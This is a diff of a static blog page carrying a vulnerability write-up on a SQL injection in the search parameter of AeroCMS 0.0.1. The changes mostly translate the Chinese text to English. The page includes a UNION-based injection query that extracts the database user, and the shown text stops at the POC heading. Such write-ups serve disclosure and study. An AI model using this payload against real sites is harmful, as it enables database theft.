@@ -26,7 +26,7 @@
 <meta property="og:image" content="http://rdyx0.github.io/2018/09/01/AeroCMS-v0.0.1-SQLi%20search_sql_injectin/image-20221113091253397.png">
 <meta property="og:image" content="http://rdyx0.github.io/2018/09/01/AeroCMS-v0.0.1-SQLi%20search_sql_injectin/image-20221111192312467.png">
 <meta property="article:published_time" content="2018-09-01T13:36:15.000Z">
-<meta property="article:modified_time" content="2022-11-13T01:44:35.103Z">
+<meta property="article:modified_time" content="2022-11-13T06:43:34.754Z">
 <meta property="article:author" content="儒道易行">
 <meta property="article:tag" content="AeroCMS">
 <meta property="article:tag" content="SQLi">
@@ -228,7 +228,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k 字
+          1.3k 字
         
       </span>
     
@@ -239,7 +239,7 @@
         
         
         
-          11 分钟
+          12 分钟
         
       </span>
     
@@ -293,13 +293,13 @@
                 <h1 id="AeroCMS-v0-0-1-SQLi-search-sql-injectin"><a href="#AeroCMS-v0-0-1-SQLi-search-sql-injectin" class="headerlink" title="AeroCMS-v0.0.1-SQLi search_sql_injectin"></a>AeroCMS-v0.0.1-SQLi search_sql_injectin</h1><h2 id="Step-to-Reproduct"><a href="#Step-to-Reproduct" class="headerlink" title="Step to Reproduct"></a>Step to Reproduct</h2><ul>
 <li>The <code>search</code> parameter from the AeroCMS-v0.0.1 CMS system appears to be vulnerable to SQL injection attacks. The malicious user can dump-steal the database, from this CMS system and he can use it for very malicious purposes.</li>
 </ul>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>查询出当前用户</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Query out the current user</p>
 <p><img src="/2018/09/01/AeroCMS-v0.0.1-SQLi%20search_sql_injectin/image-20221113091253397.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="Vulnerable-Code"><a href="#Vulnerable-Code" class="headerlink" title="Vulnerable Code"></a>Vulnerable Code</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AeroCMS</span>-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>\search.php<br></code></pre></td></tr></table></figure>
 
-<p>search参数通过POST方式传入，未经过滤带入mysql_query()函数</p>
+<p>The search parameter is passed in the POST mode and brought into the mysql_query() function without filtering</p>
 <p><img src="/2018/09/01/AeroCMS-v0.0.1-SQLi%20search_sql_injectin/image-20221111192312467.png" srcset="/img/loading.gif" lazyload></p>
-<p><strong>sql查询语句</strong></p>
+<p><strong>SQL query statements</strong></p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> posts <span class="hljs-keyword">WHERE</span> post_tags <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%a%&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>-- q%<span class="hljs-string">&#x27;&quot;</span><br></code></pre></td></tr></table></figure>
 
 <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul>
